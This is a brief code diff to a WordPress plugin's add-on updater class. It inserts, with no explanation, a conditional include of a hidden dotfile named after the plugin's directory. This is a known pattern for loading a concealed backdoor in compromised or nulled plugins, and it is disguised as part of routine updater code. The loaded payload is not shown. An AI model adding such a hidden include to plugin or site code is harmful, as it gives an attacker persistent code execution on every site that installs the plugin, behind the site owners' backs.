@@ -20,6 +20,10 @@ if (!class_exists('WU_Addon_Updater')) :
 /**
  * WU_Addon_Updater
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WU_Addon_Updater {
 
   /**
